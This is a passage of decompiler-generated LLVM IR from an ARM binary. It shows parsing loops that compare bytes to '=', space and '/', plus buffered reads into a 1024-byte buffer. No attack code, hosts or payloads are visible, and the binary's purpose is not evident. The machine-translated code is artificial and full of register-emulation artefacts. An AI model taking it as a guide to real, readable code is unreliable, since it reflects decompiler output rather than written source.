  br i1 %v7_9244, label %dec_label_pc_9284, label %dec_label_pc_924c

dec_label_pc_924c:                                ; preds = %dec_label_pc_9240
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9214, %dec_label_pc_924c
  %v0_9254 = phi i32 [ %v0_9240, %dec_label_pc_924c ], [ %v0_9254.pre, %dec_label_pc_9214 ]
  %storemerge4 = phi i32 [ %v1_9268, %dec_label_pc_924c ], [ %storemerge4.pre, %dec_label_pc_9214 ]
  store i32 %storemerge4, i32* %stack_var_-40, align 4
  store i32 %v0_9254, i32* %r0.global-to-local, align 4
  %v1_9258 = inttoptr i32 %v0_9254 to i8*
  %v2_9258 = call i32 @function_12cdc(i8* %v1_9258)
  store i32 %v2_9258, i32* %r0.global-to-local, align 4
  %v3_9260 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9260, i32* %r4.global-to-local, align 4
  %v2_9264 = sub i32 %v2_9258, %v3_9260
  %v3_9264 = icmp uge i32 %v2_9258, %v3_9260
  store i1 %v3_9264, i1* %cpsr_c.global-to-local, align 1
  %v4_9264 = xor i32 %v3_9260, %v2_9258
  %v5_9264 = xor i32 %v2_9264, %v2_9258
  %v6_9264 = and i32 %v5_9264, %v4_9264
  %v7_9264 = icmp slt i32 %v6_9264, 0
  store i1 %v7_9264, i1* %cpsr_v.global-to-local, align 1
  %v8_9264 = icmp slt i32 %v2_9264, 0
  store i1 %v8_9264, i1* %cpsr_n.global-to-local, align 1
  %v9_9264 = icmp eq i32 %v2_9258, %v3_9260
  store i1 %v9_9264, i1* %cpsr_z.global-to-local, align 1
  %v1_9268 = add i32 %v3_9260, 1
  store i32 %v1_9268, i32* %ip.global-to-local, align 4
  %v8_926c = icmp sgt i32 %v2_9258, %v3_9260
  %v0_9240 = load i32, i32* @r5, align 4
  %v2_9240 = add i32 %v0_9240, %v3_9260
  %v3_9240 = inttoptr i32 %v2_9240 to i8*
  %v4_9240 = load i8, i8* %v3_9240, align 1
  %v6_9240 = zext i8 %v4_9240 to i32
  store i32 %v6_9240, i32* %r3.global-to-local, align 4
  %v2_9244 = icmp ugt i8 %v4_9240, 60
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9244 = icmp ult i8 %v4_9240, 61
  store i1 %v6_9244, i1* %cpsr_n.global-to-local, align 1
  %v7_9244 = icmp eq i8 %v4_9240, 61
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_926c, label %dec_label_pc_9240, label %dec_label_pc_9270

dec_label_pc_9270:                                ; preds = %dec_label_pc_9254
  br i1 %v7_9244, label %dec_label_pc_9284, label %dec_label_pc_927c

dec_label_pc_927c:                                ; preds = %dec_label_pc_92c8, %dec_label_pc_92ec, %dec_label_pc_9270, %bb224
  %v0_927c = load i32, i32* @sl, align 4
  store i32 %v0_927c, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9284:                                ; preds = %dec_label_pc_9240, %dec_label_pc_9270
  %v0_9284 = load i32, i32* @r8, align 4
  %v1_9284 = add i32 %v0_9284, 12
  %v2_9284 = inttoptr i32 %v1_9284 to i32*
  %v3_9284 = load i32, i32* %v2_9284, align 4
  store i32 %v3_9284, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9290 = icmp slt i32 %v3_9284, 0
  store i1 %v1_9290, i1* %cpsr_n.global-to-local, align 1
  %v2_9290 = icmp eq i32 %v3_9284, 0
  store i1 %v2_9290, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp228 = icmp slt i32 %v3_9284, 1
  br i1 %tmp228, label %dec_label_pc_92ec, label %dec_label_pc_929c

dec_label_pc_929c:                                ; preds = %dec_label_pc_9284
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_92c8

dec_label_pc_92a4:                                ; preds = %dec_label_pc_92c8
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_92a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_92a8, i32* %r3.global-to-local, align 4
  %v0_92ac = load i32, i32* @r8, align 4
  %v1_92ac = add i32 %v0_92ac, 12
  %v2_92ac = inttoptr i32 %v1_92ac to i32*
  %v3_92ac = load i32, i32* %v2_92ac, align 4
  %v1_92b0 = add i32 %v3_92a8, 1
  store i32 %v1_92b0, i32* %ip.global-to-local, align 4
  %v2_92b4 = sub i32 %v3_92ac, %v1_92b0
  %v3_92b4 = icmp uge i32 %v3_92ac, %v1_92b0
  store i1 %v3_92b4, i1* %cpsr_c.global-to-local, align 1
  %v4_92b4 = xor i32 %v3_92ac, %v1_92b0
  %v5_92b4 = xor i32 %v2_92b4, %v3_92ac
  %v6_92b4 = and i32 %v5_92b4, %v4_92b4
  %v7_92b4 = icmp slt i32 %v6_92b4, 0
  store i1 %v7_92b4, i1* %cpsr_v.global-to-local, align 1
  %v8_92b4 = icmp slt i32 %v2_92b4, 0
  store i1 %v8_92b4, i1* %cpsr_n.global-to-local, align 1
  %v9_92b4 = icmp eq i32 %v3_92ac, %v1_92b0
  store i1 %v9_92b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_92b0, i32* %r1.global-to-local, align 4
  store i32 %v1_92b0, i32* %stack_var_-40, align 4
  %v7_92c4 = icmp sgt i32 %v3_92ac, %v1_92b0
  %v0_92d4.pre = load i32, i32* @r5, align 4
  br i1 %v7_92c4, label %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge, label %dec_label_pc_92ec

dec_label_pc_92a4.dec_label_pc_92c8_crit_edge:    ; preds = %dec_label_pc_92a4
  %v0_92d8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_92c8

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge, %dec_label_pc_929c
  %v0_92d8 = phi i32 [ %v0_92d8.pre, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ %v3_9260, %dec_label_pc_929c ]
  %v0_92d4 = phi i32 [ %v0_92d4.pre, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ %v0_9240, %dec_label_pc_929c ]
  %v0_92c8 = phi i32 [ %v1_92b0, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ 0, %dec_label_pc_929c ]
  %v1_92c8 = and i32 %v0_92c8, 33554432
  %v2_92c8 = icmp ne i32 %v1_92c8, 0
  store i1 %v2_92c8, i1* %cpsr_c.global-to-local, align 1
  %v3_92c8 = mul i32 %v0_92c8, 128
  %v1_92cc = add i32 %v3_92c8, 1472
  %v0_92d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_92d0 = add i32 %v1_92cc, %v0_92d0
  store i32 %v2_92d0, i32* %r1.global-to-local, align 4
  store i32 %v0_92d4, i32* %r0.global-to-local, align 4
  store i32 %v0_92d8, i32* %r2.global-to-local, align 4
  %v3_92dc = inttoptr i32 %v0_92d4 to i8*
  %v4_92dc = call i32 @function_13140(i8* %v3_92dc, i32 %v2_92d0, i32 %v0_92d8)
  store i32 %v4_92dc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_92e0 = icmp slt i32 %v4_92dc, 0
  store i1 %v1_92e0, i1* %cpsr_n.global-to-local, align 1
  %v2_92e0 = icmp eq i32 %v4_92dc, 0
  store i1 %v2_92e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_92e0, label %dec_label_pc_92a4, label %dec_label_pc_927c

dec_label_pc_92ec:                                ; preds = %dec_label_pc_92a4, %dec_label_pc_9284
  %v0_92ec = phi i32 [ %v0_9240, %dec_label_pc_9284 ], [ %v0_92d4.pre, %dec_label_pc_92a4 ]
  store i32 %v0_92ec, i32* %r0.global-to-local, align 4
  %v1_92f0 = inttoptr i32 %v0_92ec to i8*
  %v2_92f0 = call i32 @function_12cdc(i8* %v1_92f0)
  store i32 %v2_92f0, i32* %r0.global-to-local, align 4
  %v1_92f4 = add i32 %v2_92f0, -127
  %v2_92f4 = icmp ugt i32 %v2_92f0, 126
  store i1 %v2_92f4, i1* %cpsr_c.global-to-local, align 1
  %v3_92f4 = sub i32 126, %v2_92f0
  %v4_92f4 = and i32 %v3_92f4, %v2_92f0
  %v5_92f4 = icmp slt i32 %v4_92f4, 0
  store i1 %v5_92f4, i1* %cpsr_v.global-to-local, align 1
  %v6_92f4 = icmp slt i32 %v1_92f4, 0
  store i1 %v6_92f4, i1* %cpsr_n.global-to-local, align 1
  %v7_92f4 = icmp eq i32 %v2_92f0, 127
  store i1 %v7_92f4, i1* %cpsr_z.global-to-local, align 1
  %v8_92f8 = icmp sgt i32 %v2_92f0, 127
  br i1 %v8_92f8, label %dec_label_pc_927c, label %dec_label_pc_92fc

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v0_92fc = load i32, i32* @r8, align 4
  %v1_92fc = add i32 %v0_92fc, 12
  %v2_92fc = inttoptr i32 %v1_92fc to i32*
  %v3_92fc = load i32, i32* %v2_92fc, align 4
  %v1_9300 = and i32 %v3_92fc, 33554432
  %v2_9300 = icmp ne i32 %v1_9300, 0
  store i1 %v2_9300, i1* %cpsr_c.global-to-local, align 1
  %v3_9300 = mul i32 %v3_92fc, 128
  %v1_9304 = add i32 %v3_9300, 1472
  %v0_9308 = load i32, i32* @r5, align 4
  store i32 %v0_9308, i32* %r1.global-to-local, align 4
  %v0_930c = load i32, i32* %sb.global-to-local, align 4
  %v2_930c = add i32 %v1_9304, %v0_930c
  store i32 %v2_930c, i32* @r0, align 4
  %v2_9310 = inttoptr i32 %v2_930c to i8*
  %v3_9310 = call i32 @function_12d04(i8* %v2_9310, i32 %v0_9308)
  store i32 %v3_9310, i32* %r0.global-to-local, align 4
  %v0_9314 = load i32, i32* @r8, align 4
  %v1_9314 = add i32 %v0_9314, 12
  %v2_9314 = inttoptr i32 %v1_9314 to i32*
  %v3_9314 = load i32, i32* %v2_9314, align 4
  %v0_9318 = load i32, i32* @sl, align 4
  store i32 %v0_9318, i32* @r5, align 4
  %v1_931c = add i32 %v3_9314, 1
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  store i32 %v1_931c, i32* %v2_9314, align 4
  %v1_9134.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9328:                                ; preds = %dec_label_pc_915c, %dec_label_pc_9128
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9330 = call i32 @function_122cc(i32 38, i32* null)
  %v0_9334 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9334, i32* @r1, align 4
  store i32 %v3_9330, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9340 = call i32 @function_13030(i8* %tmp199, i32 %v0_9334, i32 %v3_9330)
  store i32 %v4_9340, i32* %r0.global-to-local, align 4
  %v1_9344 = add i32 %v4_9340, 1
  %v2_9344 = icmp eq i32 %v4_9340, -1
  store i1 %v2_9344, i1* %cpsr_c.global-to-local, align 1
  %v3_9344 = sub i32 0, %v4_9340
  %v4_9344 = and i32 %v1_9344, %v3_9344
  %v5_9344 = icmp slt i32 %v4_9344, 0
  store i1 %v5_9344, i1* %cpsr_v.global-to-local, align 1
  %v6_9344 = icmp slt i32 %v1_9344, 0
  store i1 %v6_9344, i1* %cpsr_n.global-to-local, align 1
  %v7_9344 = icmp eq i32 %v1_9344, 0
  store i1 %v7_9344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9344, label %dec_label_pc_9678, label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %dec_label_pc_9328
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9354 = call i32 @function_122cc(i32 38, i32* null)
  %v0_9358 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9358, i32* @r1, align 4
  store i32 %v3_9354, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9364 = call i32 @function_13030(i8* %tmp199, i32 %v0_9358, i32 %v3_9354)
  store i32 %v4_9364, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_9370 = add i32 %v4_9364, %v2_8748
  store i32 %v2_9370, i32* %r3.global-to-local, align 4
  %v1_9374 = load i32, i32* @r6, align 4
  %v2_9374 = add i32 %v1_9374, %v2_9370
  %v3_9374 = inttoptr i32 %v2_9374 to i8*
  %v4_9374 = load i8, i8* %v3_9374, align 1
  store i32 %v2_8280, i32* %lr.global-to-local, align 4
  %v2_937c = icmp ugt i8 %v4_9374, 31
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_937c = icmp ult i8 %v4_9374, 32
  store i1 %v6_937c, i1* %cpsr_n.global-to-local, align 1
  %v7_937c = icmp eq i8 %v4_9374, 32
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  %v2_9384 = zext i1 %v7_937c to i32
  %v2_9384.v4_9364 = add i32 %v2_9384, %v4_9364
  store i32 %v2_9384.v4_9364, i32* @r4, align 4
  %v2_9388 = add i32 %v2_9384.v4_9364, %v2_8280
  store i32 %v2_9388, i32* @r5, align 4
  store i32 %v2_9388, i32* %r0.global-to-local, align 4
  %v1_9390 = load i32, i32* %fp.global-to-local, align 4
  %v2_9390 = sub i32 %v1_9390, %v2_9384.v4_9364
  store i32 %v2_9390, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_939c = call i32 @function_12da0(i32 %v2_9388, i32 %v2_9390, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  store i32 %v5_939c, i32* %r0.global-to-local, align 4
  %v1_93a0 = add i32 %v5_939c, 1
  %v2_93a0 = icmp eq i32 %v5_939c, -1
  store i1 %v2_93a0, i1* %cpsr_c.global-to-local, align 1
  %v3_93a0 = sub i32 0, %v5_939c
  %v4_93a0 = and i32 %v1_93a0, %v3_93a0
  %v5_93a0 = icmp slt i32 %v4_93a0, 0
  store i1 %v5_93a0, i1* %cpsr_v.global-to-local, align 1
  %v6_93a0 = icmp slt i32 %v1_93a0, 0
  store i1 %v6_93a0, i1* %cpsr_n.global-to-local, align 1
  %v7_93a0 = icmp eq i32 %v1_93a0, 0
  store i1 %v7_93a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_939c, i32* %lr.global-to-local, align 4
  br i1 %v7_93a0, label %dec_label_pc_9678, label %dec_label_pc_93ac

dec_label_pc_93ac:                                ; preds = %dec_label_pc_934c
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v1_93b4 = add i32 %v5_939c, -1
  %v2_93b4 = icmp ne i32 %v5_939c, 0
  store i1 %v2_93b4, i1* %cpsr_c.global-to-local, align 1
  %v3_93b4 = sub i32 0, %v5_939c
  %v4_93b4 = and i32 %v5_939c, %v3_93b4
  %v5_93b4 = icmp slt i32 %v4_93b4, 0
  store i1 %v5_93b4, i1* %cpsr_v.global-to-local, align 1
  %v6_93b4 = icmp slt i32 %v1_93b4, 0
  store i1 %v6_93b4, i1* %cpsr_n.global-to-local, align 1
  %v7_93b4 = icmp eq i32 %v5_939c, 1
  store i1 %v7_93b4, i1* %cpsr_z.global-to-local, align 1
  %v1_93b8 = load i32, i32* @r4, align 4
  %v2_93b8 = add i32 %v1_93b8, %v2_8748
  store i32 %v2_93b8, i32* %ip.global-to-local, align 4
  %v7_93bc = icmp sgt i32 %v5_939c, 1
  br i1 %v7_93bc, label %bb229, label %bb230

bb229:                                            ; preds = %dec_label_pc_93ac
  %v9_93bc = add i32 %v5_939c, -2
  store i32 %v9_93bc, i32* %lr.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %dec_label_pc_93ac, %bb229
  %v3_93e0 = phi i32 [ %v5_939c, %dec_label_pc_93ac ], [ %v9_93bc, %bb229 ]
  %v1_93c4 = add i32 %v3_93e0, 1
  store i32 %v1_93c4, i32* %r6.global-to-local, align 4
  %v1_93c8 = add i32 %v2_93b8, -20773
  store i32 %v1_93c8, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_93d0 = load i32, i32* @r5, align 4
  store i32 %v0_93d0, i32* %r0.global-to-local, align 4
  store i32 %v1_93c4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f80.44 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_93e0 = add i32 %v3_93e0, %v1_93c8
  %v5_93e0 = inttoptr i32 %v4_93e0 to i8*
  store i8 0, i8* %v5_93e0, align 1
  %v5_93e4 = call i32 @function_12da0(i32 %v0_93d0, i32 %v1_93c4, i32 ptrtoint ([5 x i8]* @global_var_15f80.44 to i32), i32 4)
  store i32 %v5_93e4, i32* %r0.global-to-local, align 4
  %v1_93e8 = add i32 %v5_93e4, -4
  %v2_93e8 = icmp ugt i32 %v5_93e4, 3
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v3_93e8 = sub i32 3, %v5_93e4
  %v4_93e8 = and i32 %v3_93e8, %v5_93e4
  %v5_93e8 = icmp slt i32 %v4_93e8, 0
  store i1 %v5_93e8, i1* %cpsr_v.global-to-local, align 1
  %v6_93e8 = icmp slt i32 %v1_93e8, 0
  store i1 %v6_93e8, i1* %cpsr_n.global-to-local, align 1
  %v7_93e8 = icmp eq i32 %v5_93e4, 4
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93e8, label %dec_label_pc_9960, label %dec_label_pc_93f0

dec_label_pc_93f0:                                ; preds = %bb230
  store i32 %v2_8280, i32* %ip.global-to-local, align 4
  %v1_93f4 = load i32, i32* @r4, align 4
  %v2_93f4 = add i32 %v1_93f4, %v2_8280
  %v3_93f4 = inttoptr i32 %v2_93f4 to i8*
  %v4_93f4 = load i8, i8* %v3_93f4, align 1
  %v6_93f4 = zext i8 %v4_93f4 to i32
  store i32 %v6_93f4, i32* %r3.global-to-local, align 4
  %v2_93f8 = icmp ugt i8 %v4_93f4, 46
  store i1 %v2_93f8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_93f8 = icmp ult i8 %v4_93f4, 47
  store i1 %v6_93f8, i1* %cpsr_n.global-to-local, align 1
  %v7_93f8 = icmp eq i8 %v4_93f4, 47
  store i1 %v7_93f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93f8, label %dec_label_pc_9b54, label %dec_label_pc_9400

dec_label_pc_9400:                                ; preds = %dec_label_pc_94ac, %dec_label_pc_9a98, %dec_label_pc_9b84, %dec_label_pc_9b54, %dec_label_pc_9a30, %dec_label_pc_9a14, %dec_label_pc_93f0, %dec_label_pc_9ba0, %dec_label_pc_9a60
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9404 = load i32, i32* @r8, align 4
  %v3_9404 = add i32 %v2_9404, -1452
  %v4_9404 = inttoptr i32 %v3_9404 to i8*
  store i8 1, i8* %v4_9404, align 1
  br label %dec_label_pc_8838

dec_label_pc_940c:                                ; preds = %dec_label_pc_8828
  %v0_940c = call i32 @function_13c70()
  store i32 %v0_940c, i32* %r0.global-to-local, align 4
  %v0_9410 = load i32, i32* %sb.global-to-local, align 4
  %v1_9410 = add i32 %v0_9410, 1472
  store i32 %v1_9410, i32* %r3.global-to-local, align 4
  %v0_9418 = load i32, i32* @r8, align 4
  %v1_9418 = add i32 %v0_9418, 656
  %v2_9418 = inttoptr i32 %v1_9418 to i32*
  %v3_9418 = load i32, i32* %v2_9418, align 4
  store i32 %v3_9418, i32* %r3.global-to-local, align 4
  %v1_9420 = add i32 %v3_9418, -1024
  %v2_9420 = icmp ugt i32 %v3_9418, 1023
  store i1 %v2_9420, i1* %cpsr_c.global-to-local, align 1
  %v3_9420 = sub i32 1023, %v3_9418
  %v4_9420 = and i32 %v3_9420, %v3_9418
  %v5_9420 = icmp slt i32 %v4_9420, 0
  store i1 %v5_9420, i1* %cpsr_v.global-to-local, align 1
  %v6_9420 = icmp slt i32 %v1_9420, 0
  store i1 %v6_9420, i1* %cpsr_n.global-to-local, align 1
  %v7_9420 = icmp eq i32 %v3_9418, 1024
  store i1 %v7_9420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_940c, i32* %fp.global-to-local, align 4
  %v1_9428 = add i32 %v0_9410, 2116
  store i32 %v1_9428, i32* @r7, align 4
  br i1 %v7_9420, label %dec_label_pc_9528, label %dec_label_pc_9430

dec_label_pc_9430:                                ; preds = %dec_label_pc_940c, %dec_label_pc_9528, %dec_label_pc_951c
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_9434 = load i32, i32* %fp.global-to-local, align 4
  %v2_9434 = inttoptr i32 %v1_9434 to i32*
  store i32 0, i32* %v2_9434, align 4
  %v0_9438 = load i32, i32* @r8, align 4
  %v1_9438 = add i32 %v0_9438, 656
  %v2_9438 = inttoptr i32 %v1_9438 to i32*
  %v3_9438 = load i32, i32* %v2_9438, align 4
  store i32 %v3_9438, i32* %r1.global-to-local, align 4
  %v1_943c = add i32 %v0_9438, -1456
  %v2_943c = inttoptr i32 %v1_943c to i32*
  %v3_943c = load i32, i32* %v2_943c, align 4
  store i32 %v3_943c, i32* %r0.global-to-local, align 4
  %v1_9440 = sub i32 1024, %v3_9438
  store i32 %v1_9440, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9448 = load i32, i32* @r7, align 4
  %v2_9448 = add i32 %v0_9448, %v3_9438
  store i32 %v2_9448, i32* %r1.global-to-local, align 4
  %v4_944c = inttoptr i32 %v2_9448 to i32*
  %v5_944c = call i32 @function_13ea0(i32 %v3_943c, i32* %v4_944c, i32 %v1_9440, i32 16384)
  store i32 %v5_944c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9450 = icmp slt i32 %v5_944c, 0
  store i1 %v1_9450, i1* %cpsr_n.global-to-local, align 1
  %v2_9450 = icmp eq i32 %v5_944c, 0
  store i1 %v2_9450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9450, label %dec_label_pc_992c, label %dec_label_pc_9458

dec_label_pc_9458:                                ; preds = %dec_label_pc_9430
  %v1_9458 = add i32 %v5_944c, 1
  %v2_9458 = icmp eq i32 %v5_944c, -1
  store i1 %v2_9458, i1* %cpsr_c.global-to-local, align 1
  %v3_9458 = sub i32 0, %v5_944c
  %v4_9458 = and i32 %v1_9458, %v3_9458
  %v5_9458 = icmp slt i32 %v4_9458, 0
  store i1 %v5_9458, i1* %cpsr_v.global-to-local, align 1
  %v6_9458 = icmp slt i32 %v1_9458, 0
  store i1 %v6_9458, i1* %cpsr_n.global-to-local, align 1
  %v7_9458 = icmp eq i32 %v1_9458, 0
  store i1 %v7_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9458, label %dec_label_pc_9950, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9458
  %v0_9460 = load i32, i32* @r8, align 4
  %v1_9460 = add i32 %v0_9460, 656
  %v2_9460 = inttoptr i32 %v1_9460 to i32*
  %v3_9460 = load i32, i32* %v2_9460, align 4
  store i32 %v2_87d8, i32* %r1.global-to-local, align 4
  %v2_9468 = add i32 %v3_9460, %v5_944c
  store i32 %v2_9468, i32* @r4, align 4
  store i32 %v2_9468, i32* %v2_9460, align 4
  %v0_9470 = load i32, i32* %r1.global-to-local, align 4
  %v1_9470 = load i32, i32* @r8, align 4
  %v2_9470 = add i32 %v1_9470, -1448
  %v3_9470 = inttoptr i32 %v2_9470 to i32*
  store i32 %v0_9470, i32* %v3_9470, align 4
  br label %dec_label_pc_94fc

dec_label_pc_9478:                                ; preds = %dec_label_pc_94fc
  %v1_9478 = add i32 %v0_94fc, -4
  %v2_9478 = inttoptr i32 %v1_9478 to i32*
  %v3_9478 = load i32, i32* %v2_9478, align 4
  store i32 %v3_9478, i32* @sl, align 4
  %v1_947c = load i32, i32* @r4, align 4
  %v5_9480 = icmp slt i32 %v3_94fc, %v1_947c
  %storemerge73 = select i1 %v5_9480, i32 %v3_94fc, i32 %v1_947c
  store i32 %storemerge73, i32* @r5, align 4
  %v2_9488 = sub i32 %v3_94fc, %storemerge73
  store i32 %v2_9488, i32* @r6, align 4
  %v1_948c = add i32 %v3_9478, -1
  %v2_948c = icmp ne i32 %v3_9478, 0
  store i1 %v2_948c, i1* %cpsr_c.global-to-local, align 1
  %v3_948c = sub i32 0, %v3_9478
  %v4_948c = and i32 %v3_9478, %v3_948c
  %v5_948c = icmp slt i32 %v4_948c, 0
  store i1 %v5_948c, i1* %cpsr_v.global-to-local, align 1
  %v6_948c = icmp slt i32 %v1_948c, 0
  store i1 %v6_948c, i1* %cpsr_n.global-to-local, align 1
  %v7_948c = icmp eq i32 %v3_9478, 1
  store i1 %v7_948c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9488, i32* %v2_94fc, align 4
  br i1 %v7_948c, label %dec_label_pc_9548, label %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge

dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge: ; preds = %dec_label_pc_9478
  %v0_9498.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9498

dec_label_pc_9498:                                ; preds = %dec_label_pc_9508, %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge, %dec_label_pc_9570
  %v0_9498 = phi i32 [ %v3_9570, %dec_label_pc_9570 ], [ %v0_9498.pr.pre, %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge ], [ %v3_94fc, %dec_label_pc_9508 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9498 = icmp slt i32 %v0_9498, 0
  store i1 %v1_9498, i1* %cpsr_n.global-to-local, align 1
  %v2_9498 = icmp eq i32 %v0_9498, 0
  store i1 %v2_9498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9498, label %dec_label_pc_94a0, label %dec_label_pc_94c0

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9498
  %v0_94a0 = load i32, i32* @r8, align 4
  %v1_94a0 = add i32 %v0_94a0, 4
  %v2_94a0 = inttoptr i32 %v1_94a0 to i32*
  %v3_94a0 = load i32, i32* %v2_94a0, align 4
  store i32 %v3_94a0, i32* @r4, align 4
  %v1_94a4 = add i32 %v3_94a0, -1
  %v2_94a4 = icmp ne i32 %v3_94a0, 0
  store i1 %v2_94a4, i1* %cpsr_c.global-to-local, align 1
  %v3_94a4 = sub i32 0, %v3_94a0
  %v4_94a4 = and i32 %v3_94a0, %v3_94a4
  %v5_94a4 = icmp slt i32 %v4_94a4, 0
  store i1 %v5_94a4, i1* %cpsr_v.global-to-local, align 1
  %v6_94a4 = icmp slt i32 %v1_94a4, 0
  store i1 %v6_94a4, i1* %cpsr_n.global-to-local, align 1
  %v7_94a4 = icmp eq i32 %v3_94a0, 1
  store i1 %v7_94a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94a4, label %dec_label_pc_9578, label %dec_label_pc_94ac

dec_label_pc_94ac:                                ; preds = %dec_label_pc_94a0
  %v1_94ac = add i32 %v0_94a0, 656
  %v2_94ac = inttoptr i32 %v1_94ac to i32*
  %v3_94ac = load i32, i32* %v2_94ac, align 4
  %v0_94b0 = load i32, i32* @r5, align 4
  %v2_94b0 = sub i32 %v3_94ac, %v0_94b0
  store i32 %v2_94b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94b4 = icmp slt i32 %v2_94b0, 0
  store i1 %v1_94b4, i1* %cpsr_n.global-to-local, align 1
  %v2_94b4 = icmp eq i32 %v2_94b0, 0
  store i1 %v2_94b4, i1* %cpsr_z.global-to-local, align 1
  %v2_94b8 = add i32 %v0_94a0, 8
  %v3_94b8 = inttoptr i32 %v2_94b8 to i32*
  store i32 %v2_94b0, i32* %v3_94b8, align 4
  br i1 %v2_94b4, label %dec_label_pc_9400, label %dec_label_pc_94c0

dec_label_pc_94c0:                                ; preds = %dec_label_pc_9498, %dec_label_pc_94ac, %dec_label_pc_9578, %dec_label_pc_9600
  %v0_94c0 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94c0 = icmp slt i32 %v0_94c0, 0
  store i1 %v1_94c0, i1* %cpsr_n.global-to-local, align 1
  %v2_94c0 = icmp eq i32 %v0_94c0, 0
  store i1 %v2_94c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94c0, label %dec_label_pc_9510, label %dec_label_pc_94c8

dec_label_pc_94c8:                                ; preds = %dec_label_pc_94c0
  %v0_94c8 = load i32, i32* @r8, align 4
  %v1_94c8 = add i32 %v0_94c8, 656
  %v2_94c8 = inttoptr i32 %v1_94c8 to i32*
